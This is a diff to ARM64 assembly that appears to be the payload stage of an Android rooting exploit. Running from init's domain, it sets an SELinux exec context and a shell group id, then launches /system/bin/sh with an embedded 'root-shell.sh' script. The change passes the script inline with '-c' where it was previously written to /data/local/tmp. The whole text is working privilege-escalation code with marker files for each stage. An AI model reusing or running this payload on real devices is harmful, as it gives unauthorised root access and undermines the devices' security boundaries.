@@ -9,9 +9,7 @@
 
 init_shell_data:
 mutex_path:
-    .asciz "/dev/dfi"
-script_path:
-    .asciz "/data/local/tmp/dfroot-root-shell.sh"
+    .asciz "/dev/dfs"
 attr_exec:
     .asciz "/proc/self/attr/exec"
 shell_context:
@@ -19,10 +17,12 @@ shell_context:
 shell_context_end:
 shell_path:
     .asciz "/system/bin/sh"
+shell_name:
+    .asciz "sh"
+command_flag:
+    .asciz "-c"
 mark_ready:
     .asciz "/dev/dfR"
-mark_script_failed:
-    .asciz "/dev/dfW"
 mark_context_failed:
     .asciz "/dev/dfE"
 mark_gid_failed:
@@ -31,6 +31,7 @@ mark_exec_failed:
     .asciz "/dev/dfX"
 script_data:
     .incbin "root-shell.sh"
+    .byte 0
 script_data_end:
 
     .balign 4
@@ -72,27 +73,6 @@ init_shell_start:
     add sp, sp, 16
     cbnz w0, return
 
-    // Materialize the embedded command script while still in init's domain.
-    mov x0, -100
-    adr x1, script_path
-    movl x2, (O_CREAT | O_TRUNC | O_WRONLY)
-    movl x3, 0660
-    mov x8, SYS_openat
-    svc 0
-    tbnz w0, #31, script_failed
-    mov x26, x0
-    adr x1, script_data
-    adr x27, script_data_end
-    sub x27, x27, x1
-    mov x2, x27
-    mov x8, SYS_write
-    svc 0
-    cmp x0, x27
-    bne script_failed_close
-    mov x0, x26
-    mov x8, SYS_close
-    svc 0
-
     mov x0, 2000
     mov x8, SYS_setgid
     svc 0
@@ -117,11 +97,14 @@ init_shell_start:
 
     create_mark mark_ready
     adr x0, shell_path
-    sub sp, sp, 32
-    str x0, [sp]
-    adr x1, script_path
+    sub sp, sp, 48
+    adr x1, shell_name
+    str x1, [sp]
+    adr x1, command_flag
     str x1, [sp, 8]
-    str xzr, [sp, 16]
+    adr x1, script_data
+    str x1, [sp, 16]
+    str xzr, [sp, 24]
     mov x1, sp
     mov x2, xzr
     mov x8, SYS_execve
@@ -129,13 +112,6 @@ init_shell_start:
     create_mark mark_exec_failed
     b child_exit
 
-script_failed_close:
-    mov x0, x26
-    mov x8, SYS_close
-    svc 0
-script_failed:
-    create_mark mark_script_failed
-    b child_exit
 context_failed_close:
     mov x0, x26
     mov x8, SYS_close
